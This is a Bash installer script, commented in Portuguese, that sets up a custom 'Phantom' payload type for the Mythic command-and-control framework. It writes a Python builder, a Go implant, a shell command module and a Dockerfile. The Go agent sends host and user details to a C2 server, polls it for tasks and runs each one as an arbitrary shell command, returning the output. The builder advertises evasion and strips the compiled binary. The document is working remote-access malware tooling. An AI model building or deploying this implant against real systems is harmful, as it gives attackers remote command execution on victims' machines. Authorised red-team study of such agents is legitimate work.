#!/bin/bash

echo "[+] Corrigindo estrutura do Phantom para Mythic"

MYTHIC_DIR="/root/Mythic"
PHANTOM_DIR="$MYTHIC_DIR/Payload_Types/Phantom"

# Remover instalação anterior
sudo rm -rf "$PHANTOM_DIR"

# Criar estrutura correta
sudo mkdir -p "$PHANTOM_DIR/Payload_Type"
sudo mkdir -p "$PHANTOM_DIR/agent"
sudo mkdir -p "$PHANTOM_DIR/agent_functions"

echo "[+] Criando arquivos na estrutura correta..."

# Payload_Type/__init__.py (arquivo principal do payload)
sudo tee "$PHANTOM_DIR/Payload_Type/__init__.py" > /dev/null << 'EOF'
from mythic_payloadtype_container.PayloadBuilder import *
from mythic_payloadtype_container.MythicCommandBase import *
import asyncio
import os

class Phantom(PayloadType):
    name = "phantom"
    file_extension = "exe"
    author = "@phantom"
    supported_os = [SupportedOS.Windows, SupportedOS.Linux]
    wrapper = False
    wrapped_payloads = []
    note = "Advanced C2 agent with extensive evasion capabilities"
    supports_dynamic_loading = True
    mythic_encrypts = False
    translation_container = None
    agent_type = "agent"
    agent_icon_path = "./"
    
    build_parameters = [
        BuildParameter(
            name="server_url",
            parameter_type=BuildParameterType.String,
            description="C2 server URL",
            default_value="https://mythic-server.com",
        ),
        BuildParameter(
            name="sleep",
            parameter_type=BuildParameterType.Number,
            description="Sleep interval in seconds",
            default_value=5,
        ),
        BuildParameter(
            name="jitter",
            parameter_type=BuildParameterType.Number,
            description="Jitter percentage (0-100)",
            default_value=10,
        ),
    ]
    
    c2_profiles = ["http"]

    async def build(self) -> BuildResponse:
        try:
            # Build básico
            build_command = f"""
cd {self.agent_code_path}
go mod init phantom
go build -ldflags="-s -w" -o phantom main.go
"""
            
            # Executar build
            proc = await asyncio.create_subprocess_shell(
                build_command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await proc.communicate()
            
            if proc.returncode == 0:
                with open(f"{self.agent_code_path}/phantom", "rb") as f:
                    payload_data = f.read()
                
                return BuildResponse(
                    status=BuildStatus.Success,
                    payload=payload_data
                )
            else:
                return BuildResponse(
                    status=BuildStatus.Error,
                    error_message=f"Build failed: {stderr.decode()}"
                )
                
        except Exception as e:
            return BuildResponse(
                status=BuildStatus.Error,
                error_message=str(e)
            )
EOF

# Agent principal
sudo tee "$PHANTOM_DIR/agent/main.go" > /dev/null << 'EOF'
package main

import (
    "bytes"
    "encoding/json"
    "fmt"
    "io/ioutil"
    "net/http"
    "os"
    "os/exec"
    "runtime"
    "time"
)

type CheckinMessage struct {
    Action string `json:"action"`
    UUID   string `json:"uuid"`
    User   string `json:"user"`
    Host   string `json:"host"`
    PID    int    `json:"pid"`
    IP     string `json:"ip"`
    Domain string `json:"domain"`
    OS     string `json:"os"`
}

type TaskMessage struct {
    Action   string `json:"action"`
    TaskID   string `json:"task_id"`
    Command  string `json:"command"`
    Response string `json:"response"`
}

var serverURL = "http://localhost:7443"
var uuid = "phantom-agent-001"

func main() {
    fmt.Println("[+] Phantom C2 Agent Starting...")
    
    // Checkin inicial
    checkin()
    
    // Loop principal
    for {
        getTasks()
        time.Sleep(5 * time.Second)
    }
}

func checkin() {
    hostname, _ := os.Hostname()
    user := os.Getenv("USER")
    if user == "" {
        user = os.Getenv("USERNAME")
    }
    
    msg := CheckinMessage{
        Action: "checkin",
        UUID:   uuid,
        User:   user,
        Host:   hostname,
        PID:    os.Getpid(),
        IP:     "127.0.0.1",
        Domain: "",
        OS:     runtime.GOOS,
    }
    
    jsonData, _ := json.Marshal(msg)
    
    resp, err := http.Post(serverURL+"/api/v1.4/agent_message", "application/json", bytes.NewBuffer(jsonData))
    if err != nil {
        fmt.Printf("[-] Checkin failed: %v\n", err)
        return
    }
    defer resp.Body.Close()
    
    fmt.Printf("[+] Checkin successful at %s\n", time.Now().Format("15:04:05"))
}

func getTasks() {
    resp, err := http.Get(serverURL + "/api/v1.4/agent_message?uuid=" + uuid)
    if err != nil {
        return
    }
    defer resp.Body.Close()
    
    body, _ := ioutil.ReadAll(resp.Body)
    
    var tasks []TaskMessage
    json.Unmarshal(body, &tasks)
    
    for _, task := range tasks {
        result := executeCommand(task.Command)
        sendTaskResponse(task.TaskID, result)
    }
}

func executeCommand(command string) string {
    var cmd *exec.Cmd
    
    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd", "/C", command)
    } else {
        cmd = exec.Command("/bin/sh", "-c", command)
    }
    
    output, err := cmd.Output()
    if err != nil {
        return fmt.Sprintf("Error: %v", err)
    }
    
    return string(output)
}

func sendTaskResponse(taskID, response string) {
    msg := TaskMessage{
        Action:   "post_response",
        TaskID:   taskID,
        Response: response,
    }
    
    jsonData, _ := json.Marshal(msg)
    http.Post(serverURL+"/api/v1.4/agent_message", "application/json", bytes.NewBuffer(jsonData))
}
EOF

# go.mod
sudo tee "$PHANTOM_DIR/agent/go.mod" > /dev/null << 'EOF'
module phantom

go 1.21
EOF

# Comando shell
sudo tee "$PHANTOM_DIR/agent_functions/shell.py" > /dev/null << 'EOF'
from mythic_payloadtype_container.MythicCommandBase import *

class ShellArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="command",
                type=ParameterType.String,
                description="Command to execute",
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must provide a command")
        self.add_arg("command", self.command_line)

class ShellCommand(CommandBase):
    cmd = "shell"
    needs_admin = False
    help_cmd = "shell [command]"
    description = "Execute shell command"
    version = 1
    author = "@phantom"
    argument_class = ShellArguments

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, response: AgentResponse):
        pass
EOF

# __init__.py para agent_functions
sudo tee "$PHANTOM_DIR/agent_functions/__init__.py" > /dev/null << 'EOF'
from .shell import ShellCommand

__all__ = ["ShellCommand"]
EOF

# Dockerfile
sudo tee "$PHANTOM_DIR/Dockerfile" > /dev/null << 'EOF'
FROM itsafeaturemythic/mythic_payloadtype_container:latest

WORKDIR /Mythic/

COPY [".", "."]

RUN apt-get update && apt-get install -y golang-go

CMD ["python3", "-c", "from Payload_Type import *; import asyncio; asyncio.run(mythic_payloadtype_container.start_and_run_forever())"]
EOF

# requirements.txt
sudo tee "$PHANTOM_DIR/requirements.txt" > /dev/null << 'EOF'
mythic-payloadtype-container
EOF

echo "[+] Estrutura corrigida! Tentando instalar..."

cd "$MYTHIC_DIR"
sudo ./mythic-cli install folder Payload_Types/Phantom

if [ $? -eq 0 ]; then
    echo "[+] Phantom instalado com sucesso!"
else
    echo "[-] Falha na instalação. Verificando estrutura..."
    ls -la "$PHANTOM_DIR"
    ls -la "$PHANTOM_DIR/Payload_Type"
fi